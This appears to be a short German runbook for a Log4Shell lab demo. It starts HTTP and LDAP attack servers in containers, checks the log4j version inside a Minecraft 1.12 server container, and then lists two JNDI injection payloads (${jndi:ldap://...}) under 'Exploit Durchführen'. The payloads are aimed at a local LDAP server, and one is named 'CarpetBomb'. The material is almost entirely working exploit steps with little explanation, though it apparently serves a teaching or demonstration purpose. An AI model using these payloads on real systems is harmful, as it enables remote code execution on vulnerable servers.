# 1. Server starten

```bash
podman-compose up
```
```bash
./log4shelltools/run-http-container.sh
```
```bash
./log4shelltools/run-ldap-container.sh
```

Oder in einer TMUX Session
```bash
./start_services.sh
```

# 2. Setup Erklären
```bash
podman exec mc ls -la /log4shelltools/scripts
```
```bash
podman exec mc find / -name "log4j-core*.jar" 2>/dev/null
```
```bash
podman exec mc unzip -l /data/minecraft_server.1.12.jar | grep -i log4j
```
```bash
podman exec mc unzip -p /data/minecraft_server.1.12.jar | strings | grep -i "log4j.*version"
```

# 3. Exploit Durchführen
```bash
${jndi:ldap://127.0.0.1:1389/SystemOut}
```
```bash
${jndi:ldap://127.0.0.1:1389/CarpetBomb}
```
